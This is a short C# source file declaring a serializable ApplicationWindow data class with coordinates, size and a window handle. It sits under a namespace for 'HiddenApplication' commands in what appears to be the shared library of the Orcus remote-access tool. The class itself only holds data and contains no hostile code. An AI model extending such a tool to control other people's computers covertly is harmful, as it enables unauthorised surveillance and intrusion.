using System;

namespace Orcus.Shared.Commands.HiddenApplication
{
    [Serializable]
    public class ApplicationWindow
    {
        public int X { get; set; }
        public int Y { get; set; }
        public int Width { get; set; }
        public int Height { get; set; }
        public long Handle { get; set; }
    }
}